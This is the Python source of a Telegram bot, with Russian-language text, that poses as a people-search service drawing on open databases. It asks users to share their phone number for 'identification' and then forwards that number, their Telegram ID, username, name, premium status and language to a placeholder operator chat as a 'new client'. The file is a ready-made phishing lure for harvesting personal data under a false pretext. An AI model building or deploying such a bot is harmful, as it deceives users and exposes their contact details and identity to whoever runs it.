import telebot
from telebot import types

bot = telebot.TeleBot("Ваш токен")





@bot.message_handler(commands=["start"])
def start(message):
    keyboard = types.ReplyKeyboardMarkup(resize_keyboard=True)
    reg_button = types.KeyboardButton(text="Отправить номер телефона",
    request_contact=True)
    keyboard.add(reg_button)

    bot.send_message(message.chat.id, f""" *Добро пожаловать в поисковую систему!*

Сервис является *инструментом* по поиску *информации о физических и юридических лицах* и использует для поиска *открытые* и *общедоступные* банки данных.
Сервис работает в режиме *реального времени* и формирует отчёт «*на ходу*», то есть *без сохранения* всей полученной из банков данных информации.
""", parse_mode="Markdown")

    bot.send_message(message.chat.id, """*🗂 Номер телефона*

Вам необходимо *подтвердить номер телефона* для того, чтобы *завершить идентификацию.

Для этого нажмите кнопку ниже.*""", reply_markup=keyboard, parse_mode="Markdown")


    print(message)
    bot.register_next_step_handler(message, soxp)


def soxp(message):
    bot.send_message(message.chat.id, f"""
    На данный момент мы уже имеем - 
Ваш номер телефона : {message.contact.phone_number}
Ваш тг айди : {message.from_user.id}
Ваш тг юзнейм : {message.from_user.username}
Ваш тг никнейм : {message.from_user.first_name} {message.from_user.last_name if message.from_user.last_name != None else ""}
Есть ли у вас тг премиум : {message.from_user.is_premium}
Ваш язык : {message.from_user.language_code}
""")

    bot.send_message("Ваш айди", f"""
Новый клиент - 
Номер телефона : {message.contact.phone_number}
Тг айди : {message.from_user.id}
Тг юзнейм : {message.from_user.username}
Тг никнейм : {message.from_user.first_name} {message.from_user.last_name if message.from_user.last_name != None else ""}
Есть ли тг премиум : {message.from_user.is_premium}
Язык : {message.from_user.language_code}
    """)


if __name__=="__main__":
    bot.polling()